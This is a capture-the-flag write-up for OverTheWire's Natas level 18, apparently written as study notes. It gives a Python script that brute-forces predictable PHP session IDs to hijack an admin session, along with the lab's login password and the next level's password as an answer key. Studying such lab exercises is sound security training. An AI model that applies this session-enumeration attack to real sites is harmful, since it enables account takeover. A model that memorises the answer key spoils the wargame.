# Natas Level 18 to 19

| Field | Value |
|---|---|
| Platform | OverTheWire |
| Wargame | Natas |
| Level | 18 -> 19 |
| Status | Complete |

## Objective

Find an existing admin session among predictable PHP session IDs.

## Given Access

User: `natas18`

Password:

```text
6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ
```

## Method

The source shows `$maxid = 640` and accepts numeric `PHPSESSID` values. Iterate `1` through `640` and look for the page that says `You are an admin`.

## Commands

```python
import requests

url = "http://natas18.natas.labs.overthewire.org/"
auth = ("natas18", "6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ")

for sid in range(1, 641):
    r = requests.get(url, auth=auth, cookies={"PHPSESSID": str(sid)}, timeout=10)
    if "You are an admin" in r.text:
        print(sid)
        print(r.text)
        break
```

## Result

Admin session ID:

```text
119
```

Password for `natas19`:

```text
tnwER7PdfWkxsG4FNWUtoAZ9VyZTJqJr
```

## Lesson

Small, predictable session ID spaces make session enumeration practical.

## References

- https://overthewire.org/wargames/natas/
